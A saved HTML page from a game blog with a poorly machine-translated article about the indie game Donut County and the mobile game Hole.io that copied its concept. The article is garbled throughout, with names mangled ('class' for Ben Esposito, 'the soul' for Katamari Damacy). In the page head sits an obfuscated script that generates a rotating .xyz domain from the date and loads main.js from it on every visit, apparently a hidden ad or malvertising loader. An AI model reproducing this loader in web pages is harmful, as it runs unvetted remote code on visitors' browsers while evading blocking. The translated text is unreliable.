<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="Some time ago, the author came into contact with an independent game called donut count, in which players control a “black hole” and complete the puzzle of each level by “swallowing” the instruments i">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="Doughnut city is a city where people travel for five years and marry for others">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="Some time ago, the author came into contact with an independent game called donut count, in which players control a “black hole” and complete the puzzle of each level by “swallowing” the instruments i">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/46d8474100ae4ed9960a63ea4226a828.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/0078313d53fc4314b36ce4dc5a1db16b.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/bfe5a00dcd1f4346bc201ac43695d44f.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/c0f86fcc78064688a68b04498e8e8f2a.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/c9bc7d70a9314232bb4442c846b7ae88.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/5c6dcbcccb6f422fa3c2e458f39867d5.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/5adc925feec84b5f82718161bb2f99d9.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/fc9455a2e8a94d91915600ec4a299a66.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/19947e31bb7b4b18a318dba00bdbdce1.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/669326e86a154e5e92283079c2caca87.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:48.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Doughnut city is a city where people travel for five years and marry for others">
<meta name="twitter:description" content="Some time ago, the author came into contact with an independent game called donut count, in which players control a “black hole” and complete the puzzle of each level by “swallowing” the instruments i">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/46d8474100ae4ed9960a63ea4226a828.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Doughnut city is a city where people travel for five years and marry for others | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Doughnut city is a city where people travel for five years and marry for others</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Some time ago, the author came into contact with an independent game called donut count, in which players control a “black hole” and complete the puzzle of each level by “swallowing” the instruments in various scenes. The simple and lovely polygon painting style combines all kinds of interesting physical puzzles, and there is also a story full of comedy effect. The whole game experience is very relaxed and happy, which makes it hard to stop after getting started.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/46d8474100ae4ed9960a63ea4226a828.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>However, when playing, this game always brings the author a sense of both seeing and seeing: I’ve seen this game before. Although it’s played differently, it’s true that there’s such a game, and it used to be very popular. At one time, I thought whether this independent game copied that game or not. After several queries and comparisons, the author found that there was indeed plagiarism, but the former plagiarized the latter.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/0078313d53fc4314b36ce4dc5a1db16b.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>That’s right that’s it</p>
<h1 id="games-without-protagonists"><a href="#games-without-protagonists" class="headerlink" title="games without protagonists"></a>games without protagonists</h1><p>Donut County, translated as doughnut city in China, is a physics puzzle independent game created by Ben Esposito alone for five years. The original inspiration of the game came from a concept put forward on the Internet by Peter Molineux (nicknamed “magic bull”), a former lion studio game master, in 2012. He said:   “you can play a hole in the scene Move around so that specific elements fall into the hole “ “ at the right time. This concept inspired the same class as the game producer: why the protagonist in the game must be a role, not a concept? As magic bull said, it’s OK to let players play a hole in the game, and the hole is not a role, but a concept. With this in mind, Ben tried to make the game.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/bfe5a00dcd1f4346bc201ac43695d44f.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>Introduction to Ben Esposito’s homepage<br>During the development of the game, class also made a great reference to the PS2 game “Katamari Damacy” produced and released by Nanmeng palace in 2004. This is a leisure game. The playing rule is to control a villain to pick up objects scattered around the scene by rolling “blocks”. The “blocks” will stick these objects into a ball, and the goal of the game is to set a time limit Roll the “block” into the required size and launch it into the air. Although the overall style of the game is slightly curious, it is full of interest and is a kind of game work full of fun. Ban combined the concept of “black hole” of magic bull with “the soul”, thus derived   “black hole can make itself bigger by swallowing to swallow larger objects, but just blindly swallowing it is the same as the play method of” greedy for fish “, so why not add the puzzle element through the characteristics of black hole, after all, no one has said that black hole must exist like a bottomless hole”  “ Law.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/c0f86fcc78064688a68b04498e8e8f2a.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>PSV version of “the soul” game screen</p>
<h1 id="take-the-lead"><a href="#take-the-lead" class="headerlink" title="take the lead"></a>take the lead</h1><p>Before becoming an independent game producer, ban worked as a checkpoint planner in the “giant sparrow” studio and participated in the development of the puzzle game “the unfinished swan”. His previous experience in making puzzle plays has been fully utilized in the development of new works. It only takes one year for the class to create the game. However, in the process of production, the class has more and more creative inspiration. He wants to add all these contents to the game, so the game is overthrown and redone again and again. Because of the lack of technical ability of himself, he has to learn and develop at the same time.<br>The game was put into production in 2013. Two years later, in 2015, he took the game to the independent game festival of that year and released the first publicity video. At that time, it seemed that the general playing method and system design of the work had been completed, and the rest was the polishing of plot and details.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/c9bc7d70a9314232bb4442c846b7ae88.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>The first picture of a promotional film of doughnut City<br>When the first trailer was released, Ben didn’t say the exact release date of the game. After all, he didn’t know how many times he needed to overturn the game. How much effort has been paid for this game? Only the class knows it by itself. Watching the game get closer to completion, but what the class didn’t expect is that someone was ahead of him.<br>On May 25, 2018, the app store launched a leisure mobile game called “hole. IO”, which immediately topped the free game download list. This game has a well-known name in China called “black hole battle”, which is produced by voodoo, a well-known small game developer. The game of this hand game is to control a black hole. In a limited time, the player will devour anything you can see in the scene. The more you devour, the larger the volume will be. The game also supports multi player online, and even can devour a smaller black hole than you.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/5c6dcbcccb6f422fa3c2e458f39867d5.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>Black hole battle app store page<br>For those who know more about the mobile game circle, voodoo, a French developer, has always been famous for copying other family games. Previously, Voodoo has copied several accused stories. For example, endless Golf copied Justin Smith’s desert gorf, Kelly snow copied Dave chener’s powder Alpine simulator, and Dai I also complained on twitter that “the game I released in 2015 was copied in 2017, and the funny thing is that people who play Shanzhai games still send emails to scold me for plagiarism”.<br>After all, it has been six years since the concept of “magic cow” was put forward. You said that no one would believe that it would take six years to develop a small leisure game with weak playing methods. And ban is a little famous in the game developer community. If other netizens didn’t trust him, he didn’t know his game had been used for reference.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/5adc925feec84b5f82718161bb2f99d9.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>There are always one or two voodoo games you’ve played</p>
<p>#Quality is more than everything<br>Obviously, Voodoo imitated the concept and playing method of the game either from the promotional film or from the demo, but compared with the design idea of class’s doughnut City, it seems that voodoo just took away the core concept of the game, and did not take away the content that the class has not yet announced. As we all know, there is no copyright in the way of playing the game, and the class itself is very aggrieved about it, and he can’t help it. After that, ban posted such a tweet on his own Twitter:<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/fc9455a2e8a94d91915600ec4a299a66.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>In other words, he didn’t expect that there would be a copycat version of his game that hasn’t been released yet, and he won the first place in several countries. He was very grateful for this. Fortunately, Voodoo didn’t launch the game when it was half developed, but chose to launch the game when it was about to be released. If it happened to catch up with him to overthrow and redo again, he would be mad. He also said that it’s good for everyone to know about the plagiarism of voodoo. He hoped that the peers would take confidentiality measures for their own games in the future and not spend too long on an original game like him. Doughnut City, developed by him, is a puzzle game with interesting plot. It’s totally different from black hole battle. There’s no need to fight for two games. I hope the players will like his game.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/19947e31bb7b4b18a318dba00bdbdce1.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>Official game screen<br>    concluding remarks<br>The sales volume of the game has not failed the efforts of the class for five years. The high quality of the game has won the praise of the players. After logging in to the app store, the game has been recommended by the home page of about 16 countries. The sales volume of the game once ranked in the top 10 of the 65 countries’ paid game rankings. After logging into steam platform later, it also got the game evaluation of “special praise”, and so far, 84% of the praise rate.<br><img src="http://maiygu.xyz/2019/11/08/Doughnut city is a city where people travel for five years and marry for others/669326e86a154e5e92283079c2caca87.jpg" alt="Doughnut city is a city where people travel for five years and marry for others"><br>Doughnut city steam page<br>After the great success of the game, some media found a class and asked him about his mental journey over the past five years. To this end, he said, “I think I learned a lot in this way and learned more about how to play the game, but I also saw the dark side of the industry. Now I really realize how difficult it is to play the game and what kind of accident it will encounter, which also makes me understand Reality, in the past, I was overconfident, but I really did little. Now I have a deeper understanding of why high-quality games are expensive. “<br>After witnessing the success of doughnut City, it’s ironic to look back at the 4.6-point evaluation of “black hole battle” on the app store.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/Do mow without knowing what to do, let glory lay down the unparalleled series of strategy games/" rel="next" title="Do mow without knowing what to do, let glory lay down the unparalleled series of strategy games">
                <i class="fa fa-chevron-left"></i> Do mow without knowing what to do, let glory lay down the unparalleled series of strategy games
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/Craig studio, the successor of CRPG who is more brave and fearless/" rel="prev" title="Craig studio, the successor of CRPG who is more brave and fearless">
                Craig studio, the successor of CRPG who is more brave and fearless <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#games-without-protagonists"><span class="nav-number">1.</span> <span class="nav-text">games without protagonists</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#take-the-lead"><span class="nav-number">2.</span> <span class="nav-text">take the lead</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
